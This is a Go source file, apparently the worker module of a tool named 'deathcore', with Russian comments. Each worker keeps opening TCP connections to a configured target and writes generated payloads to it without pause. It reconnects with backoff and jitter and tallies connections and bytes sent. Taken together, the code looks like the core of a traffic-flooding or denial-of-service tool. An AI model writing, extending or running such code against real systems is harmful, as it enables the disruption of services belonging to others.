package worker
import (
        "context"
        "fmt"
        "math/rand/v2"
        "net"
        "sync/atomic"
        "time"
        "deathcore/config"
        "deathcore/core"
)
// Глобальные счётчики для статистики
var (
        TotalConnections int64
        TotalBytesSent   int64
        ActiveWorkers    int64
)
func Run(ctx context.Context, id int, cfg *config.Config, dialer *core.Dialer, gen core.PayloadGenerator) {
        atomic.AddInt64(&ActiveWorkers, 1)
        defer atomic.AddInt64(&ActiveWorkers, -1)
        retry := 0
        for {
                select {
                case <-ctx.Done():
                        return
                default:
                }
                conn, err := dialer.Dial(ctx, cfg.TargetAddr)
                if err != nil {
                        delay := backoff(cfg, retry)
                        retry++
                        timer := time.NewTimer(delay)
                        select {
                        case <-ctx.Done():
                                timer.Stop()
                                return
                        case <-timer.C:
                        }
                        continue
                }
                retry = 0
                atomic.AddInt64(&TotalConnections, 1)
                if tcpConn, ok := conn.(*net.TCPConn); ok {
                        tcpConn.SetKeepAlive(true)
                        tcpConn.SetKeepAlivePeriod(30 * time.Second)
                }
                done := make(chan struct{})
                writeErr := make(chan error, 1)
                // Читатель
                go func() {
                        defer close(done)
                        buf := make([]byte, 32768)
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }
                                if cfg.ReadTimeout > 0 {
                                        conn.SetReadDeadline(time.Now().Add(cfg.ReadTimeout))
                                }
                                _, err := conn.Read(buf)
                                if err != nil {
                                        return
                                }
                        }
                }()
                // Писатель
                go func() {
                        defer func() {
                                conn.Close()
                                writeErr <- nil
                        }()
                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                case <-done:
                                        return
                                default:
                                }
                                msg, err := gen.Next()
                                if err != nil {
                                        return
                                }
                                n, err := conn.Write(msg)
                                if err != nil {
                                        return
                                }
                                atomic.AddInt64(&TotalBytesSent, int64(n))
                        }
                }()
                select {
                case <-ctx.Done():
                        conn.Close()
                        return
                case <-writeErr:
                }
                if cfg.ReconnectDelay == 0 && cfg.MaxBackoff == 0 {
                        continue
                }
                delay := backoff(cfg, retry)
                retry++
                timer := time.NewTimer(delay)
                select {
                case <-ctx.Done():
                        timer.Stop()
                        return
                case <-timer.C:
                }
        }
}
func backoff(cfg *config.Config, attempt int) time.Duration {
        if cfg.MaxBackoff == 0 {
                return 0
        }
        base := 200 * time.Millisecond
        max := cfg.MaxBackoff
        if max <= 0 {
                max = 30 * time.Second
        }
        b := time.Duration(float64(base) * float64(int(1<<min(attempt, 10))))
        if b > max {
                b = max
        }
        jitter := time.Duration(rand.Int64N(int64(b / 2)))
        return b + jitter
}
func min(a, b int) int {
        if a < b {
                return a
        }
        return b
}
// Stats возвращает текущую статистику
func Stats() string {
        conns := atomic.LoadInt64(&TotalConnections)
        bytes := atomic.LoadInt64(&TotalBytesSent)
        active := atomic.LoadInt64(&ActiveWorkers)
        return fmt.Sprintf("[deathcore] connections: %d | active: %d | sent: %s",
                conns, active, formatBytes(bytes))
}
func formatBytes(b int64) string {
        const unit = 1024
        if b < unit {
                return fmt.Sprintf("%d B", b)
        }
        div, exp := int64(unit), 0
        for n := b / unit; n >= unit; n /= unit {
                div *= unit
                exp++
        }
        return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}
